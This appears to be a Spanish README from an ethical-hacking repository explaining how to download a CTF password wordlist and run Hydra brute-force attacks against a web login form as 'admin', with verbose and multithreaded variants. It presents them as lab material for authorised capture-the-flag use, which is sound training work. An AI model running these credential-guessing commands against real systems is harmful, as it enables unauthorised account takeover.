## Cómo usar este diccionario en Kali Linux

### 1. Descargar el diccionario

```bash
wget -O wordlistVIU_ctf.txt "https://raw.githubusercontent.com/cenoboa0/Hacking-e-tico-/main/Diccionario%20Hydra/wordlistVIU_ctf.txt"
```

### 2. Verificar la descarga

```bash
wc -l wordlistVIU_ctf.txt
head -20 wordlistVIU_ctf.txt
```

### 3. Lanzar Hydra

```bash
hydra -l admin -P wordlistVIU_ctf.txt TARGET http-get-form \
  "/ruta/login.php:login=^USER^&password=^PASS^:F=Incorrect"
```

### 4. Modo verbose (ver cada intento)

```bash
hydra -l admin -P wordlistVIU_ctf.txt -V TARGET http-get-form \
  "/ruta/login.php:login=^USER^&password=^PASS^:F=Incorrect"
```

### 5. Con múltiples hilos (más rápido)

```bash
hydra -l admin -P wordlistVIU_ctf.txt -t 16 TARGET http-get-form \
  "/ruta/login.php:login=^USER^&password=^PASS^:F=Incorrect"
```

> Sustituye `TARGET` por la IP o dominio del laboratorio y ajusta la ruta del formulario según el reto.

---

**Nota:** Este diccionario está diseñado exclusivamente para entornos CTF y laboratorios con autorización. No usar contra sistemas sin permiso explícito.
